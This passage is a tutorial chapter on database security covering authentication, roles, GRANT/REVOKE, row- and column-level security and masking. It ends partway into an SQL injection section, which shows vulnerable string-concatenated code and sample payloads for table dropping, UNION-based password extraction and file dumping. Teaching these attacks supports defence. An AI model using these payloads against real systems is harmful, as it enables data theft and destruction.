# Phase 16 — Security & Access Control

> **Database security** is the last line of defence — if an attacker reaches your database, only the access controls you configured stand between them and your data. This phase covers authentication, authorization, privilege management, Row-Level Security, SQL injection, and encryption.

---

## Table of Contents

1. [Why Database Security Matters](#1-why-database-security-matters)
2. [Authentication vs Authorization](#2-authentication-vs-authorization)
3. [Users, Roles & Groups](#3-users-roles-and-groups)
4. [GRANT, REVOKE & DENY](#4-grant-revoke-and-deny)
5. [Role-Based Access Control (RBAC)](#5-role-based-access-control)
6. [Row-Level Security (RLS)](#6-row-level-security)
7. [Column-Level Security](#7-column-level-security)
8. [SQL Injection — Attack & Prevention](#8-sql-injection)
9. [Encryption — At Rest & In Transit](#9-encryption)
10. [Auditing & Monitoring](#10-auditing-and-monitoring)
11. [Multi-Database Security Reference](#11-multi-database-reference)
12. [Worked Examples](#12-worked-examples)
13. [Common Interview Questions](#13-interview-questions)
14. [Key Takeaways](#14-key-takeaways)
15. [Download](#15-download)

---

## 1. Why Database Security Matters

### Real-World Analogy

A database is like a bank vault. **Authentication** is the ID check at the door — proving who you are. **Authorization** is the key that opens only *your* safe-deposit box, not everyone else's. **Encryption** is a lock on each box so that even if someone breaks into the vault, the contents are unreadable. **Auditing** is the security camera recording every access.

### Defence in Depth

<svg viewBox="0 0 750 340" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <text x="375" y="25" text-anchor="middle" font-size="16" font-weight="bold" fill="#1a1a2e">Defence-in-Depth — Database Security Layers</text>

  <!-- Outermost ring -->
  <rect x="30" y="45" width="690" height="280" rx="18" fill="#ffebee" stroke="#c62828" stroke-width="2.5"/>
  <text x="375" y="68" text-anchor="middle" font-size="13" font-weight="bold" fill="#c62828">Network Security — Firewalls, VPN, TLS</text>

  <!-- Second ring -->
  <rect x="65" y="80" width="620" height="230" rx="14" fill="#fff3e0" stroke="#e65100" stroke-width="2"/>
  <text x="375" y="100" text-anchor="middle" font-size="12" font-weight="bold" fill="#e65100">Authentication — Who are you? (password, certificate, LDAP, Kerberos)</text>

  <!-- Third ring -->
  <rect x="100" y="112" width="550" height="185" rx="12" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="375" y="132" text-anchor="middle" font-size="12" font-weight="bold" fill="#1565c0">Authorization — What can you do? (GRANT / REVOKE / RBAC)</text>

  <!-- Fourth ring -->
  <rect x="135" y="144" width="480" height="140" rx="10" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2"/>
  <text x="375" y="164" text-anchor="middle" font-size="12" font-weight="bold" fill="#2e7d32">Row-Level & Column-Level Security — Which rows/columns?</text>

  <!-- Core -->
  <rect x="185" y="178" width="380" height="90" rx="10" fill="#f3e5f5" stroke="#6a1b9a" stroke-width="2"/>
  <text x="375" y="203" text-anchor="middle" font-size="13" font-weight="bold" fill="#6a1b9a">Encryption & Masking</text>
  <text x="375" y="222" text-anchor="middle" font-size="11" fill="#555">At rest (TDE) | In transit (TLS) | Application-level</text>
  <text x="375" y="240" text-anchor="middle" font-size="11" fill="#555">Dynamic data masking | Tokenisation</text>
  <text x="375" y="258" text-anchor="middle" font-size="11" fill="#555">Even if breached → data is unreadable</text>

  <!-- Audit bar -->
  <rect x="30" y="300" width="690" height="22" rx="4" fill="#37474f"/>
  <text x="375" y="316" text-anchor="middle" font-size="11" fill="#fff" font-weight="bold">Auditing & Monitoring — Logs every access (who, what, when, from where)</text>
</svg>

---

## 2. Authentication vs Authorization

<svg viewBox="0 0 750 260" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <text x="375" y="25" text-anchor="middle" font-size="16" font-weight="bold" fill="#1a1a2e">Authentication vs Authorization</text>

  <!-- Authentication -->
  <rect x="30" y="50" width="320" height="190" rx="12" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="190" y="78" text-anchor="middle" font-size="14" font-weight="bold" fill="#1565c0">Authentication (AuthN)</text>
  <text x="190" y="100" text-anchor="middle" font-size="12" fill="#333">"Who are you?"</text>
  <line x1="60" y1="110" x2="320" y2="110" stroke="#bbdefb" stroke-width="1"/>
  <text x="55" y="132" font-size="11" fill="#555">• Username + password</text>
  <text x="55" y="150" font-size="11" fill="#555">• Client certificate (mTLS)</text>
  <text x="55" y="168" font-size="11" fill="#555">• Kerberos / GSSAPI</text>
  <text x="55" y="186" font-size="11" fill="#555">• LDAP / Active Directory</text>
  <text x="55" y="204" font-size="11" fill="#555">• SCRAM-SHA-256 (PostgreSQL)</text>
  <text x="55" y="222" font-size="11" fill="#555">• IAM roles (AWS RDS)</text>

  <!-- Arrow -->
  <text x="375" y="145" text-anchor="middle" font-size="24" fill="#666">→</text>
  <text x="375" y="165" text-anchor="middle" font-size="10" fill="#666">then</text>

  <!-- Authorization -->
  <rect x="400" y="50" width="320" height="190" rx="12" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2"/>
  <text x="560" y="78" text-anchor="middle" font-size="14" font-weight="bold" fill="#2e7d32">Authorization (AuthZ)</text>
  <text x="560" y="100" text-anchor="middle" font-size="12" fill="#333">"What can you do?"</text>
  <line x1="430" y1="110" x2="690" y2="110" stroke="#c8e6c9" stroke-width="1"/>
  <text x="425" y="132" font-size="11" fill="#555">• Object privileges (SELECT, INSERT …)</text>
  <text x="425" y="150" font-size="11" fill="#555">• Schema privileges</text>
  <text x="425" y="168" font-size="11" fill="#555">• System privileges (CREATE TABLE …)</text>
  <text x="425" y="186" font-size="11" fill="#555">• Row-Level Security (RLS)</text>
  <text x="425" y="204" font-size="11" fill="#555">• Column-level GRANT</text>
  <text x="425" y="222" font-size="11" fill="#555">• DENY overrides (SQL Server)</text>
</svg>

### PostgreSQL Authentication — pg_hba.conf

PostgreSQL controls authentication via `pg_hba.conf` (Host-Based Authentication):

```
# TYPE  DATABASE  USER       ADDRESS        METHOD
local   all       all                       peer
host    all       all        127.0.0.1/32   scram-sha-256
host    all       all        10.0.0.0/8     scram-sha-256
host    all       all        0.0.0.0/0      reject
hostssl mydb      app_user   10.0.1.0/24    cert
```

| Method | Description |
|---|---|
| `peer` | OS username must match DB username (local connections) |
| `scram-sha-256` | Password hashed with SCRAM (recommended) |
| `md5` | Password hashed with MD5 (legacy — avoid) |
| `cert` | Client TLS certificate authentication |
| `ldap` | Authenticate against LDAP/AD server |
| `gss` | Kerberos/GSSAPI authentication |
| `reject` | Deny connection |
| `trust` | Accept without password (NEVER in production) |

### SQL Server Authentication Modes

| Mode | Description |
|---|---|
| **Windows Authentication** | Kerberos/NTLM via Active Directory — no password stored in DB |
| **SQL Server Authentication** | Username + password stored in DB (hashed) |
| **Mixed Mode** | Both methods accepted |
| **Azure AD Authentication** | For Azure SQL Database — integrates with Azure AD |

---

## 3. Users, Roles & Groups

### PostgreSQL

```sql
-- Create a login role (user)
CREATE ROLE app_user LOGIN PASSWORD 'secure_password_here';

-- Create a group role (no login)
CREATE ROLE readonly NOLOGIN;

-- Grant the group role to the user
GRANT readonly TO app_user;

-- Roles can inherit privileges
ALTER ROLE app_user INHERIT;  -- inherits privileges from all member roles

-- Connection limits
ALTER ROLE app_user CONNECTION LIMIT 10;

-- Temporal access
ALTER ROLE temp_user VALID UNTIL '2026-06-01';
```

### SQL Server

```sql
-- Create a login (server-level)
CREATE LOGIN app_user WITH PASSWORD = 'secure_password_here';

-- Create a database user mapped to the login
CREATE USER app_user FOR LOGIN app_user;

-- Create a database role
CREATE ROLE readonly_role;

-- Add user to role
ALTER ROLE readonly_role ADD MEMBER app_user;

-- Fixed server roles
ALTER SERVER ROLE sysadmin ADD MEMBER dba_user;  -- full control (use sparingly!)
```

### MySQL

```sql
-- Create user with host restriction
CREATE USER 'app_user'@'10.0.1.%' IDENTIFIED BY 'secure_password_here';

-- Create role
CREATE ROLE 'readonly_role';

-- Grant role to user
GRANT 'readonly_role' TO 'app_user'@'10.0.1.%';

-- Activate role
SET DEFAULT ROLE 'readonly_role' TO 'app_user'@'10.0.1.%';
```

---

## 4. GRANT, REVOKE & DENY

### Privilege Hierarchy

<svg viewBox="0 0 750 320" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <defs>
    <marker id="arrowP" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#1565c0"/>
    </marker>
  </defs>

  <text x="375" y="25" text-anchor="middle" font-size="16" font-weight="bold" fill="#1a1a2e">Privilege Hierarchy</text>

  <!-- Server level -->
  <rect x="250" y="45" width="250" height="45" rx="8" fill="#ffcdd2" stroke="#c62828" stroke-width="2"/>
  <text x="375" y="73" text-anchor="middle" font-size="12" font-weight="bold" fill="#c62828">Server / Instance Level</text>
  <text x="375" y="87" text-anchor="middle" font-size="9" fill="#666">CREATE DATABASE, SHUTDOWN, SUPERUSER</text>
  <line x1="375" y1="90" x2="375" y2="110" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowP)"/>

  <!-- Database level -->
  <rect x="230" y="112" width="290" height="45" rx="8" fill="#ffe0b2" stroke="#e65100" stroke-width="2"/>
  <text x="375" y="140" text-anchor="middle" font-size="12" font-weight="bold" fill="#e65100">Database Level</text>
  <text x="375" y="154" text-anchor="middle" font-size="9" fill="#666">CONNECT, CREATE SCHEMA, TEMP</text>
  <line x1="375" y1="157" x2="375" y2="177" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowP)"/>

  <!-- Schema level -->
  <rect x="210" y="179" width="330" height="45" rx="8" fill="#fff9c4" stroke="#f9a825" stroke-width="2"/>
  <text x="375" y="207" text-anchor="middle" font-size="12" font-weight="bold" fill="#f9a825">Schema Level</text>
  <text x="375" y="221" text-anchor="middle" font-size="9" fill="#666">CREATE, USAGE (access objects within schema)</text>
  <line x1="375" y1="224" x2="375" y2="244" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowP)"/>

  <!-- Object level -->
  <rect x="170" y="246" width="410" height="55" rx="8" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="375" y="270" text-anchor="middle" font-size="12" font-weight="bold" fill="#1565c0">Object Level (Table / View / Function / Sequence)</text>
  <text x="375" y="286" text-anchor="middle" font-size="9" fill="#666">SELECT, INSERT, UPDATE, DELETE, TRUNCATE, REFERENCES, TRIGGER, EXECUTE</text>
  <text x="375" y="298" text-anchor="middle" font-size="9" fill="#666">Column-level: SELECT(col), UPDATE(col)</text>
</svg>

### GRANT Syntax

```sql
-- PostgreSQL: grant SELECT on a table
GRANT SELECT ON employees TO readonly;

-- Grant multiple privileges
GRANT SELECT, INSERT, UPDATE ON orders TO app_role;

-- Grant all privileges
GRANT ALL PRIVILEGES ON customers TO admin_role;

-- Grant on all tables in a schema
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly;

-- Set default privileges for future tables
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT ON TABLES TO readonly;

-- Grant with the ability to re-grant (WITH GRANT OPTION)
GRANT SELECT ON employees TO team_lead WITH GRANT OPTION;
```

### REVOKE Syntax

```sql
-- Revoke a specific privilege
REVOKE INSERT ON orders FROM app_role;

-- Revoke all privileges
REVOKE ALL PRIVILEGES ON customers FROM old_user;

-- Cascade revoke (also revoke from anyone they granted to)
REVOKE SELECT ON employees FROM team_lead CASCADE;
```

### DENY (SQL Server Only)

`DENY` explicitly blocks a privilege — it **overrides** any `GRANT`, even through role membership.

```sql
-- SQL Server
GRANT SELECT ON employees TO hr_role;
DENY SELECT ON employees(salary) TO hr_intern;  -- blocks column even though role has SELECT

-- Precedence: DENY > GRANT > no permission
```

### Privilege Resolution

<svg viewBox="0 0 650 220" xmlns="http://www.w3.org/2000/svg" style="max-width:650px; font-family:Arial,sans-serif;">
  <defs>
    <marker id="arrowRes" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#333"/>
    </marker>
  </defs>

  <text x="325" y="22" text-anchor="middle" font-size="14" font-weight="bold" fill="#1a1a2e">Privilege Resolution Order (SQL Server)</text>

  <!-- Check DENY -->
  <rect x="30" y="50" width="130" height="50" rx="8" fill="#ffcdd2" stroke="#c62828" stroke-width="2"/>
  <text x="95" y="72" text-anchor="middle" font-size="11" font-weight="bold" fill="#c62828">DENY exists?</text>
  <text x="95" y="87" text-anchor="middle" font-size="10" fill="#333">→ Blocked</text>

  <line x1="160" y1="75" x2="200" y2="75" stroke="#333" stroke-width="1.5" marker-end="url(#arrowRes)"/>
  <text x="180" y="67" font-size="9" fill="#666">No</text>

  <!-- Check GRANT -->
  <rect x="205" y="50" width="130" height="50" rx="8" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2"/>
  <text x="270" y="72" text-anchor="middle" font-size="11" font-weight="bold" fill="#2e7d32">GRANT exists?</text>
  <text x="270" y="87" text-anchor="middle" font-size="10" fill="#333">→ Allowed</text>

  <line x1="335" y1="75" x2="375" y2="75" stroke="#333" stroke-width="1.5" marker-end="url(#arrowRes)"/>
  <text x="355" y="67" font-size="9" fill="#666">No</text>

  <!-- Check role -->
  <rect x="380" y="50" width="130" height="50" rx="8" fill="#fff9c4" stroke="#f9a825" stroke-width="2"/>
  <text x="445" y="72" text-anchor="middle" font-size="11" font-weight="bold" fill="#f9a825">Role GRANT?</text>
  <text x="445" y="87" text-anchor="middle" font-size="10" fill="#333">→ Allowed</text>

  <line x1="510" y1="75" x2="540" y2="75" stroke="#333" stroke-width="1.5" marker-end="url(#arrowRes)"/>
  <text x="528" y="67" font-size="9" fill="#666">No</text>

  <!-- Default deny -->
  <rect x="545" y="50" width="80" height="50" rx="8" fill="#eeeeee" stroke="#666" stroke-width="2"/>
  <text x="585" y="72" text-anchor="middle" font-size="11" font-weight="bold" fill="#666">Default</text>
  <text x="585" y="87" text-anchor="middle" font-size="10" fill="#c62828">DENIED</text>

  <!-- PostgreSQL note -->
  <rect x="30" y="130" width="590" height="70" rx="8" fill="#f5f5f5" stroke="#999" stroke-width="1"/>
  <text x="325" y="152" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">PostgreSQL — No DENY Statement</text>
  <text x="325" y="172" text-anchor="middle" font-size="11" fill="#555">PostgreSQL uses REVOKE only. To block a specific privilege inherited from a role,</text>
  <text x="325" y="189" text-anchor="middle" font-size="11" fill="#555">revoke from the user directly or use a separate role without that privilege.</text>
</svg>

---

## 5. Role-Based Access Control (RBAC)

### Concept

Instead of granting privileges directly to every user, you create **roles** that represent job functions, grant privileges to the roles, then assign users to roles.

### RBAC Architecture

<svg viewBox="0 0 750 340" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <defs>
    <marker id="arrowRBAC" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#1565c0"/>
    </marker>
  </defs>

  <text x="375" y="25" text-anchor="middle" font-size="16" font-weight="bold" fill="#1a1a2e">RBAC — Role-Based Access Control</text>

  <!-- Users -->
  <rect x="20" y="60" width="150" height="260" rx="10" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="95" y="85" text-anchor="middle" font-size="13" font-weight="bold" fill="#1565c0">Users</text>
  <rect x="35" y="98" width="120" height="28" rx="5" fill="#bbdefb"/>
  <text x="95" y="117" text-anchor="middle" font-size="11" fill="#333">alice</text>
  <rect x="35" y="133" width="120" height="28" rx="5" fill="#bbdefb"/>
  <text x="95" y="152" text-anchor="middle" font-size="11" fill="#333">bob</text>
  <rect x="35" y="168" width="120" height="28" rx="5" fill="#bbdefb"/>
  <text x="95" y="187" text-anchor="middle" font-size="11" fill="#333">carol</text>
  <rect x="35" y="203" width="120" height="28" rx="5" fill="#bbdefb"/>
  <text x="95" y="222" text-anchor="middle" font-size="11" fill="#333">dave</text>
  <rect x="35" y="238" width="120" height="28" rx="5" fill="#bbdefb"/>
  <text x="95" y="257" text-anchor="middle" font-size="11" fill="#333">eve</text>
  <rect x="35" y="273" width="120" height="28" rx="5" fill="#bbdefb"/>
  <text x="95" y="292" text-anchor="middle" font-size="11" fill="#333">frank</text>

  <!-- Roles -->
  <rect x="270" y="60" width="170" height="260" rx="10" fill="#fff3e0" stroke="#e65100" stroke-width="2"/>
  <text x="355" y="85" text-anchor="middle" font-size="13" font-weight="bold" fill="#e65100">Roles</text>
  <rect x="285" y="100" width="140" height="35" rx="6" fill="#ffe0b2"/>
  <text x="355" y="122" text-anchor="middle" font-size="11" fill="#333" font-weight="bold">db_admin</text>
  <rect x="285" y="150" width="140" height="35" rx="6" fill="#ffe0b2"/>
  <text x="355" y="172" text-anchor="middle" font-size="11" fill="#333" font-weight="bold">app_readwrite</text>
  <rect x="285" y="200" width="140" height="35" rx="6" fill="#ffe0b2"/>
  <text x="355" y="222" text-anchor="middle" font-size="11" fill="#333" font-weight="bold">analyst_readonly</text>
  <rect x="285" y="250" width="140" height="35" rx="6" fill="#ffe0b2"/>
  <text x="355" y="272" text-anchor="middle" font-size="11" fill="#333" font-weight="bold">hr_sensitive</text>

  <!-- Privileges -->
  <rect x="540" y="60" width="190" height="260" rx="10" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2"/>
  <text x="635" y="85" text-anchor="middle" font-size="13" font-weight="bold" fill="#2e7d32">Privileges</text>
  <text x="555" y="112" font-size="10" fill="#555">SELECT, INSERT, UPDATE,</text>
  <text x="555" y="127" font-size="10" fill="#555">DELETE, CREATE, DROP,</text>
  <text x="555" y="142" font-size="10" fill="#555">ALTER, TRUNCATE</text>
  <line x1="555" y1="152" x2="715" y2="152" stroke="#c8e6c9"/>
  <text x="555" y="170" font-size="10" fill="#555">SELECT on all tables</text>
  <text x="555" y="185" font-size="10" fill="#555">SELECT, INSERT, UPDATE</text>
  <text x="555" y="200" font-size="10" fill="#555">on orders, products</text>
  <line x1="555" y1="210" x2="715" y2="210" stroke="#c8e6c9"/>
  <text x="555" y="228" font-size="10" fill="#555">SELECT on analytics views</text>
  <line x1="555" y1="238" x2="715" y2="238" stroke="#c8e6c9"/>
  <text x="555" y="256" font-size="10" fill="#555">SELECT on employees</text>
  <text x="555" y="271" font-size="10" fill="#555">(incl. salary, SSN cols)</text>

  <!-- User → Role arrows -->
  <line x1="170" y1="112" x2="285" y2="117" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="170" y1="147" x2="285" y2="167" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="170" y1="147" x2="285" y2="117" stroke="#1565c0" stroke-width="1" stroke-dasharray="4,3" marker-end="url(#arrowRBAC)"/>
  <line x1="170" y1="182" x2="285" y2="167" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="170" y1="217" x2="285" y2="217" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="170" y1="252" x2="285" y2="217" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="170" y1="287" x2="285" y2="267" stroke="#1565c0" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>

  <!-- Role → Privilege arrows -->
  <line x1="425" y1="117" x2="540" y2="117" stroke="#2e7d32" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="425" y1="167" x2="540" y2="185" stroke="#2e7d32" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="425" y1="217" x2="540" y2="228" stroke="#2e7d32" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
  <line x1="425" y1="267" x2="540" y2="260" stroke="#2e7d32" stroke-width="1.5" marker-end="url(#arrowRBAC)"/>
</svg>

### PostgreSQL RBAC Setup

```sql
-- 1. Create roles (no login)
CREATE ROLE app_readwrite NOLOGIN;
CREATE ROLE analyst_readonly NOLOGIN;
CREATE ROLE hr_sensitive NOLOGIN;

-- 2. Grant privileges to roles
GRANT USAGE ON SCHEMA public TO app_readwrite, analyst_readonly;

GRANT SELECT, INSERT, UPDATE, DELETE
   ON ALL TABLES IN SCHEMA public
   TO app_readwrite;

GRANT SELECT
   ON ALL TABLES IN SCHEMA public
   TO analyst_readonly;

GRANT SELECT ON employees TO hr_sensitive;  -- includes salary column

-- 3. Default privileges for future tables
ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT ON TABLES TO analyst_readonly;

ALTER DEFAULT PRIVILEGES IN SCHEMA public
    GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_readwrite;

-- 4. Create users and assign roles
CREATE ROLE alice LOGIN PASSWORD 'alice_pass';
GRANT app_readwrite TO alice;

CREATE ROLE dave LOGIN PASSWORD 'dave_pass';
GRANT analyst_readonly TO dave;

CREATE ROLE frank LOGIN PASSWORD 'frank_pass';
GRANT hr_sensitive TO frank;
```

### Principle of Least Privilege

| Principle | Implementation |
|---|---|
| **Minimum necessary privileges** | Only grant what the role needs — never ALL PRIVILEGES |
| **No shared accounts** | Each person/service gets a unique login |
| **Separate read/write roles** | Analysts get readonly, apps get readwrite |
| **Revoke public defaults** | `REVOKE ALL ON DATABASE mydb FROM PUBLIC;` |
| **Time-limited access** | `VALID UNTIL` for temporary roles |
| **Regular audits** | Review who has what — quarterly minimum |

---

## 6. Row-Level Security (RLS)

### Concept

RLS lets you control **which rows** a user can see or modify, based on the user's identity or role. The policy is enforced transparently — the user writes normal SQL and the engine adds invisible `WHERE` clauses.

### Real-World Analogy

In a multi-tenant SaaS application, Company A's employees should only see Company A's data. Without RLS, you'd add `WHERE tenant_id = :current_tenant` to every query — and one missed filter means a data breach. With RLS, the database **enforces** the filter automatically.

### PostgreSQL RLS

```sql
-- 1. Enable RLS on the table
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

-- 2. Create a policy — users see only their own tenant's orders
CREATE POLICY tenant_isolation ON orders
    USING (tenant_id = current_setting('app.current_tenant')::INT);

-- 3. Force RLS for table owner too (otherwise owner bypasses policies)
ALTER TABLE orders FORCE ROW LEVEL SECURITY;

-- 4. Set the tenant context per session
SET app.current_tenant = '42';
SELECT * FROM orders;  -- only sees tenant_id = 42
```

### RLS Policy Types

```sql
-- SELECT policy (who can see which rows)
CREATE POLICY read_own ON orders
    FOR SELECT
    USING (tenant_id = current_setting('app.current_tenant')::INT);

-- INSERT policy (what rows can be inserted)
CREATE POLICY insert_own ON orders
    FOR INSERT
    WITH CHECK (tenant_id = current_setting('app.current_tenant')::INT);

-- UPDATE policy (what rows can be modified and what the new values must satisfy)
CREATE POLICY update_own ON orders
    FOR UPDATE
    USING (tenant_id = current_setting('app.current_tenant')::INT)
    WITH CHECK (tenant_id = current_setting('app.current_tenant')::INT);

-- DELETE policy
CREATE POLICY delete_own ON orders
    FOR DELETE
    USING (tenant_id = current_setting('app.current_tenant')::INT);
```

### Role-Based RLS — Department Access

```sql
-- Employees can see their own department
CREATE POLICY dept_access ON employees
    FOR SELECT
    USING (
        department = current_setting('app.user_department')
        OR current_user IN (SELECT rolname FROM pg_roles WHERE rolsuper)
    );

-- Managers can see their own and subordinate departments
CREATE POLICY manager_access ON employees
    FOR SELECT
    TO manager_role
    USING (
        department IN (
            SELECT dept_name FROM department_hierarchy
             WHERE manager_dept = current_setting('app.user_department')
        )
    );
```

### SQL Server RLS

```sql
-- 1. Create a predicate function
CREATE FUNCTION dbo.fn_tenant_filter(@tenant_id INT)
RETURNS TABLE
WITH SCHEMABINDING
AS
RETURN SELECT 1 AS result
       WHERE @tenant_id = CAST(SESSION_CONTEXT(N'tenant_id') AS INT);

-- 2. Create a security policy
CREATE SECURITY POLICY dbo.TenantFilter
    ADD FILTER PREDICATE dbo.fn_tenant_filter(tenant_id) ON dbo.orders,
    ADD BLOCK PREDICATE  dbo.fn_tenant_filter(tenant_id) ON dbo.orders
    WITH (STATE = ON);

-- 3. Set context per session
EXEC sp_set_session_context @key = N'tenant_id', @value = 42;
```

<svg viewBox="0 0 750 210" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <text x="375" y="22" text-anchor="middle" font-size="15" font-weight="bold" fill="#1a1a2e">RLS — Invisible Filter Applied</text>

  <!-- User query -->
  <rect x="30" y="45" width="220" height="50" rx="8" fill="#e3f2fd" stroke="#1565c0" stroke-width="2"/>
  <text x="140" y="68" text-anchor="middle" font-size="11" fill="#333">User writes:</text>
  <text x="140" y="84" text-anchor="middle" font-size="11" fill="#1565c0" font-weight="bold">SELECT * FROM orders;</text>

  <text x="270" y="75" font-size="18" fill="#666">→</text>

  <!-- Engine applies -->
  <rect x="290" y="40" width="240" height="60" rx="8" fill="#fff3e0" stroke="#e65100" stroke-width="2"/>
  <text x="410" y="63" text-anchor="middle" font-size="11" fill="#333">Engine rewrites to:</text>
  <text x="410" y="79" text-anchor="middle" font-size="10" fill="#e65100" font-weight="bold">SELECT * FROM orders</text>
  <text x="410" y="93" text-anchor="middle" font-size="10" fill="#e65100" font-weight="bold">WHERE tenant_id = 42;</text>

  <text x="548" y="75" font-size="18" fill="#666">→</text>

  <!-- Result -->
  <rect x="570" y="45" width="160" height="50" rx="8" fill="#e8f5e9" stroke="#2e7d32" stroke-width="2"/>
  <text x="650" y="68" text-anchor="middle" font-size="11" fill="#333">Returns only</text>
  <text x="650" y="84" text-anchor="middle" font-size="11" fill="#2e7d32" font-weight="bold">tenant 42's rows</text>

  <!-- Benefit bar -->
  <rect x="30" y="120" width="700" height="70" rx="8" fill="#f5f5f5" stroke="#999"/>
  <text x="375" y="145" text-anchor="middle" font-size="12" font-weight="bold" fill="#333">Benefits of RLS</text>
  <text x="140" y="168" text-anchor="middle" font-size="10" fill="#555">No code changes needed</text>
  <text x="375" y="168" text-anchor="middle" font-size="10" fill="#555">Can't be bypassed by app bugs</text>
  <text x="600" y="168" text-anchor="middle" font-size="10" fill="#555">Works with all SQL tools</text>
  <text x="140" y="185" text-anchor="middle" font-size="10" fill="#555">Centralized enforcement</text>
  <text x="375" y="185" text-anchor="middle" font-size="10" fill="#555">Different policies per role</text>
  <text x="600" y="185" text-anchor="middle" font-size="10" fill="#555">Audit-friendly</text>
</svg>

---

## 7. Column-Level Security

### Column-Level GRANT (PostgreSQL)

```sql
-- Grant SELECT on specific columns only
GRANT SELECT (name, department, hire_date) ON employees TO analyst_readonly;
-- analyst_readonly CANNOT see: salary, ssn, personal_email

-- Column-level UPDATE
GRANT UPDATE (email, phone) ON employees TO hr_role;
-- hr_role can change email/phone but NOT salary
```

### Dynamic Data Masking (SQL Server)

```sql
-- Mask email: show first character + "XXX@XXXX.com"
ALTER TABLE customers
    ALTER COLUMN email ADD MASKED WITH (FUNCTION = 'email()');

-- Mask SSN: show last 4 digits
ALTER TABLE employees
    ALTER COLUMN ssn ADD MASKED WITH (FUNCTION = 'partial(0,"XXX-XX-",4)');

-- Mask salary: show 0
ALTER TABLE employees
    ALTER COLUMN salary ADD MASKED WITH (FUNCTION = 'default()');

-- Grant UNMASK to trusted roles
GRANT UNMASK TO hr_manager;

-- Users without UNMASK see masked values:
-- email: aXXX@XXXX.com    ssn: XXX-XX-4567    salary: 0
```

### View-Based Column Security (Cross-Platform)

```sql
-- Create a restricted view
CREATE VIEW employees_public AS
SELECT id, name, department, hire_date
  FROM employees;
-- Salary, SSN, personal info excluded

GRANT SELECT ON employees_public TO analyst_readonly;
REVOKE SELECT ON employees FROM analyst_readonly;
```

---

## 8. SQL Injection — Attack & Prevention

### What Is SQL Injection?

SQL injection occurs when user-supplied input is **concatenated directly** into a SQL query string, allowing an attacker to modify the query's logic.

### The Attack

<svg viewBox="0 0 750 310" xmlns="http://www.w3.org/2000/svg" style="max-width:750px; font-family:Arial,sans-serif;">
  <text x="375" y="25" text-anchor="middle" font-size="16" font-weight="bold" fill="#c62828">SQL Injection — How It Works</text>

  <!-- Vulnerable code -->
  <rect x="30" y="50" width="690" height="70" rx="8" fill="#ffebee" stroke="#c62828" stroke-width="2"/>
  <text x="45" y="72" font-size="12" font-weight="bold" fill="#c62828">Vulnerable Application Code (Python):</text>
  <text x="45" y="92" font-size="11" fill="#333" font-family="monospace">query = "SELECT * FROM users WHERE name = '" + user_input + "'"</text>
  <text x="45" y="110" font-size="10" fill="#c62828">String concatenation — NEVER do this!</text>

  <!-- Normal input -->
  <rect x="30" y="135" width="330" height="70" rx="8" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="45" y="157" font-size="11" font-weight="bold" fill="#2e7d32">Normal Input: Alice</text>
  <text x="45" y="177" font-size="10" fill="#333" font-family="monospace">SELECT * FROM users</text>
  <text x="45" y="192" font-size="10" fill="#333" font-family="monospace">WHERE name = 'Alice'</text>

  <!-- Malicious input -->
  <rect x="390" y="135" width="330" height="70" rx="8" fill="#ffebee" stroke="#c62828" stroke-width="2"/>
  <text x="405" y="157" font-size="11" font-weight="bold" fill="#c62828">Malicious: ' OR '1'='1</text>
  <text x="405" y="177" font-size="10" fill="#333" font-family="monospace">SELECT * FROM users</text>
  <text x="405" y="192" font-size="10" fill="#c62828" font-family="monospace">WHERE name = '' OR '1'='1'</text>

  <!-- Result -->
  <rect x="390" y="210" width="330" height="30" rx="4" fill="#c62828"/>
  <text x="555" y="230" text-anchor="middle" font-size="11" fill="#fff" font-weight="bold">Returns ALL users — data breach!</text>

  <!-- Advanced attacks -->
  <rect x="30" y="255" width="690" height="45" rx="8" fill="#fff3e0" stroke="#e65100" stroke-width="1.5"/>
  <text x="375" y="275" text-anchor="middle" font-size="12" font-weight="bold" fill="#e65100">Advanced SQL Injection Payloads</text>
  <text x="45" y="293" font-size="10" fill="#333">' ; DROP TABLE users; --    |    ' UNION SELECT username,password FROM admin_users --    |    ' OR 1=1; COPY TO '/tmp/dump' --</text>
</svg>

